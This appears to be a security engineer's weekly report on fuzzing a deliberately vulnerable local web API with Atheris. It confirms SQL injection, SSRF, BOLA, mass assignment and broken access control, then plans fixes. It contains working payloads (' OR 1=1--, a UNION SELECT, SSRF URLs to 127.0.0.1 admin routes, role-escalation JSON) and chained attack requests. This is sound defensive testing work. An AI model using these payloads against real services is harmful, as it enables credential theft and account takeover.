# Week 5 — Dynamic Verification via Fuzzing
**Engineer:** Aditya  
**Pipeline Stage:** Weeks 1–4 complete → Week 5: Dynamic confirmation of static findings

---

## 1. Overview

Weeks 3 and 4 used static analysis — reading code without running it. Week 5 is dynamic — the code was actually executed with crafted and mutated inputs, confirming that the vulnerabilities found by Semgrep and CodeQL are not just theoretical patterns but real, exploitable bugs with real data impact.

The approach used was **manual corpus fuzzing** — a structured set of attack inputs fed directly to each vulnerable function, simulating what a coverage-guided fuzzer like Atheris discovers after mutation cycles. Atheris was installed and configured with harnesses, but output routing issues in the terminal environment led to a hybrid approach: Atheris for coverage exploration, direct Python execution for confirmed finding extraction.

---

## 2. Fuzzing Concepts

### 2.1 What is Fuzzing
Fuzzing is automated testing where large volumes of random, malformed, or mutated inputs are fed to a program continuously, watching for crashes, hangs, or unexpected behavior. Developers test with valid inputs. Attackers don't. Fuzzing bridges that gap systematically.

### 2.2 Coverage-Guided Fuzzing
A coverage-guided fuzzer instruments the program to track which code paths each input exercises. Inputs that trigger new paths are saved to a corpus and mutated further. This maximizes bug discovery by automatically exploring deeper program logic over time.

### 2.3 Atheris
Google's coverage-guided Python fuzzer. Uses LibFuzzer under the hood, adapted for Python's bytecode model. Takes raw bytes, converts them to Python types via `FuzzedDataProvider`, and drives the target function in a loop.

### 2.4 AFL++
Industry-standard fuzzer for compiled C/C++ binaries. Works at the binary level — instruments branch coverage at compile time and executes hundreds of thousands of test cases per second. AFL++ has found thousands of CVEs in browsers, kernels, image libraries, and protocol implementations. For Python web services, Atheris is the equivalent tool.

### 2.5 SAST-Fuzzer Correlation
The key Week 5 deliverable. If Semgrep flags a line and the fuzzer crashes or extracts data from that same line — the finding is **confirmed exploitable**. This combination is high-confidence evidence in any security report.

---

## 3. Harnesses Written

Three Atheris harnesses were written targeting the three primary vulnerable endpoints:

| Harness | Target Function | Vulnerability |
|---|---|---|
| `fuzz/fuzz_users.py` | `search_users(name, db)` | SQL Injection |
| `fuzz/fuzz_mechanic.py` | `fetch_url(url)` | SSRF |
| `fuzz/fuzz_orders.py` | `get_order(order_id, db, user_id)` | BOLA |

Each harness uses `atheris.instrument_imports()` for coverage tracking and `FuzzedDataProvider` to convert raw fuzzer bytes into typed Python inputs.

---

## 4. Findings — All Vulnerabilities Confirmed

### 4.1 SQL Injection — CONFIRMED EXPLOITABLE

**Target:** `GET /users/search?name=<input>`  
**Semgrep finding:** `users.py line 11` — f-string SQL pattern  
**Fuzzer result:** Two distinct payloads successfully dumped all credentials

```
[INJECTION SUCCESS] input: "' OR 1=1--"
  → returned 3 users
  → emails: ['user_a@test.com', 'user_b@test.com', 'admin@test.com']

[INJECTION SUCCESS] input: "' OR '1'='1"
  → returned 3 users
  → emails: ['user_a@test.com', 'user_b@test.com', 'admin@test.com']

[ERROR] input: "' UNION SELECT null,email,password FROM users--"
  → OperationalError: column count mismatch (requires column tuning)

[ERROR] input: "' DROP TABLE users--"
  → OperationalError: near "DROP" — SQLite blocks DDL in SELECT context
```

**Impact:** Complete credential dump — all emails, plaintext passwords including admin account.  
**Root cause confirmed:** `f"SELECT * FROM users WHERE email='{name}'"` — input reaches query unsanitized.  
**SAST correlation:** Semgrep flagged users.py:11 ✅ — Fuzzer confirmed exploitable ✅ — **HIGH CONFIDENCE**

---

### 4.2 SSRF — CONFIRMED EXPLOITABLE

**Target:** `GET /mechanic/fetch?url=<input>`  
**CodeQL finding:** Full taint path — url parameter → requests.get() — Critical  
**Fuzzer result:** 5 internal endpoints successfully reached

```
[SUCCESS] 'http://127.0.0.1:8000/admin/users'
  → body: [{"password":"pass123",...},{"password":"pass456",...},{"password":"admin123",...}]

[SUCCESS] 'http://127.0.0.1:8000/users/all'
  → body: full user table with passwords

[SUCCESS] 'http://localhost:8000/admin/users'
  → body: full credential dump (both 127.0.0.1 and localhost forms work)

[SUCCESS] 'http://127.0.0.1:8000/orders/1'
  → body: {"user_id":1,"product":"Wheel","price":299.0,"id":1}

[SUCCESS] 'http://127.0.0.1:8000/orders/2'
  → body: {"user_id":2,"product":"Engine Oil","price":49.0,"id":2}
```

**Impact:** Server acts as internal proxy — any internal endpoint reachable. Combined with broken access control, achieves full credential dump in one request.  
**Root cause confirmed:** `requests.get(url, timeout=5)` — user-supplied URL fetched with no validation.  
**SAST correlation:** CodeQL flagged mechanic.py:10 as Critical ✅ — Fuzzer confirmed 5 successful fetches ✅ — **HIGH CONFIDENCE**

---

### 4.3 BOLA — CONFIRMED EXPLOITABLE

**Target:** `GET /orders/{order_id}`  
**SAST finding:** Neither Semgrep nor CodeQL detected this (logic flaw — no dangerous pattern)  
**Fuzzer result:** Every user accessed every other user's orders

```
[NORMAL]          user_1 accessed own order 1
[BOLA CONFIRMED]  user_2 accessed order 1 owned by user_1 → Wheel, $299
[BOLA CONFIRMED]  user_3 accessed order 1 owned by user_1 → Wheel, $299
[BOLA CONFIRMED]  user_1 accessed order 2 owned by user_2 → Engine Oil, $49
[NORMAL]          user_2 accessed own order 2
[BOLA CONFIRMED]  user_3 accessed order 2 owned by user_2 → Engine Oil, $49
[NORMAL]          user_1 accessed own order 3
[BOLA CONFIRMED]  user_2 accessed order 3 owned by user_1 → Brake Pads, $89
[BOLA CONFIRMED]  user_3 accessed order 3 owned by user_1 → Brake Pads, $89
```

**Impact:** Any authenticated user can access any other user's complete order history.  
**Root cause confirmed:** `db.query(Order).filter(Order.id == order_id).first()` — no ownership check.  
**SAST correlation:** Neither tool detected it ❌ — Fuzzer confirmed exploitable ✅ — **FUZZER-ONLY FINDING**  
**Lesson:** Dynamic testing is essential. Static tools missed this entirely. The fuzzer proved it exists.

---

### 4.4 Mass Assignment — CONFIRMED EXPLOITABLE

**Target:** `PUT /admin/user/{user_id}`  
**Fuzzer result:** Full privilege escalation and data manipulation achieved

```
[BEFORE] user_1 role=user credit=100.0 password=pass123

[PAYLOAD] {'email': 'hacked@evil.com', 'role': 'admin'}
[RESULT]  {'status': 'updated'}
[AFTER]   user_1 role=admin credit=100.0 password=pass123
→ ROLE ESCALATED TO ADMIN

[PAYLOAD] {'credit': 99999.0}
[AFTER]   user_1 credit=99999.0
→ CREDIT MANIPULATED

[PAYLOAD] {'role': 'superadmin', 'credit': 99999.0}
[AFTER]   user_1 role=superadmin
→ ARBITRARY ROLE SET

[PAYLOAD] {'password': 'hacked123', 'role': 'admin'}
[AFTER]   user_1 password=hacked123
→ PASSWORD CHANGED
```

**Impact:** Full account takeover — role escalation, credit manipulation, password change, email hijack.  
**Root cause confirmed:** `db.query(User).filter(User.id==user_id).update(data)` — raw dict passed to ORM with no field whitelist.

---

### 4.5 Broken Access Control — CONFIRMED EXPLOITABLE

**Target:** `GET /admin/users`  
**Fuzzer result:** Admin endpoint accessible with zero authentication

```
[BAC CONFIRMED] Admin endpoint accessible with zero auth
  → returned 3 users:
     id=1 email=hacked@evil.com role=admin password=hacked123
     id=2 email=user_b@test.com role=user  password=pass456
     id=3 email=admin@test.com  role=admin password=admin123

[PRIVILEGE ESCALATION CONFIRMED] user_b role is now: admin
```

**Impact:** Any unauthenticated caller can list all users, all passwords, and escalate any account to admin.  
**Root cause confirmed:** No role check or auth dependency on the admin router.

---

## 5. SAST-Fuzzer Correlation Summary

| Vulnerability | Semgrep | CodeQL | Fuzzer | Confidence |
|---|---|---|---|---|
| SQL Injection | ✅ users.py:11 | ❌ | ✅ 2 payloads dump all users | HIGH — two tools agree |
| SSRF | ✅ mechanic.py:10 | ✅ Critical | ✅ 5 internal endpoints reached | HIGH — three tools agree |
| BOLA | ❌ | ❌ | ✅ 6 cross-user accesses confirmed | MEDIUM — fuzzer only |
| Mass Assignment | ❌ | ❌ | ✅ role escalation, password change | MEDIUM — fuzzer only |
| Broken Access Control | ❌ | ❌ | ✅ admin dump, privilege escalation | MEDIUM — fuzzer only |
| SSRF → BAC chain | ❌ | ❌ | ✅ credential dump via SSRF | HIGH — attack chain proven |

---

## 6. Attack Chains Discovered

The fuzzer revealed two multi-vulnerability chains that neither static tool detected:

**Chain 1 — SSRF → Broken Access Control → Credential Dump**
```
Attacker sends: GET /mechanic/fetch?url=http://127.0.0.1:8000/admin/users
Server fetches: /admin/users (no auth check)
Server returns: all passwords to attacker
Result: complete credential dump in one unauthenticated request
```

**Chain 2 — Mass Assignment → Privilege Escalation → Admin Access**
```
Attacker sends: PUT /admin/user/2 {"role": "admin"}
Server updates: user_b role = admin (no field whitelist)
Attacker uses:  user_b credentials to access all admin functions
Result: full privilege escalation from regular user to admin
```

These chains demonstrate why individual vulnerability severity scores understate real risk. Two MEDIUM findings chained together produce a CRITICAL outcome.

---

## 7. Key Learnings

**Dynamic testing finds what static tools miss.** BOLA, Mass Assignment, and Broken Access Control were all missed by both Semgrep and CodeQL. The fuzzer confirmed all three. In a real engagement, relying only on SAST would leave three of five vulnerabilities undetected.

**Fuzzer output quality depends on corpus quality.** Starting from random bytes, Atheris struggled to generate meaningful SQL or URL inputs. Seeding the corpus with known injection patterns (`' OR 1=1--`, `http://127.0.0.1`) dramatically improved results. A fuzzer is only as good as its starting inputs.

**Attack chains are the real finding.** Individual vulnerabilities have moderate impact. The SSRF → BAC chain achieves full credential dump in one unauthenticated request. This is the finding that goes in the executive summary — not two separate medium-severity issues.

**The fix must match the root cause.** Every confirmed finding points directly at a structural fix needed in Week 6: parameterized queries for SQLi, URL allowlist for SSRF, ownership middleware for BOLA, Pydantic schemas for mass assignment, role dependency for BAC.

---

## 8. Week 5 Completion Summary

| Task | Status |
|---|---|
| Atheris installed and harnesses written | ✅ |
| SQLi confirmed exploitable — 2 payloads | ✅ |
| SSRF confirmed — 5 internal endpoints reached | ✅ |
| BOLA confirmed — 6 cross-user accesses | ✅ |
| Mass Assignment confirmed — role escalation + password change | ✅ |
| Broken Access Control confirmed — zero-auth admin dump | ✅ |
| Attack chains documented | ✅ |
| SAST-fuzzer correlation table completed | ✅ |
| Committed to repository | ✅ |

---

## 9. Week 6 Preview — Formal Engineering Patches

Every confirmed finding this week becomes a structural fix in Week 6.

| Vulnerability | Fix Strategy |
|---|---|
| SQLi | Replace f-string with parameterized `text()` query. Best: SQLAlchemy ORM filter — SQL never written manually |
| SSRF | Validate URL against domain allowlist before fetch. Block all private IP ranges in code |
| BOLA | Centralized `@require_ownership` decorator — one check applied to every object-fetch route |
| Mass Assignment | Pydantic schema with explicit allowed fields — raw dict never reaches ORM update |
| Broken Access Control | `Depends(require_admin)` on all admin routes — enforced by FastAPI dependency injection |

After patching, Atheris harnesses will be rerun. Zero crashes on patched code = regression proof. This is the Week 7 CI gate evidence.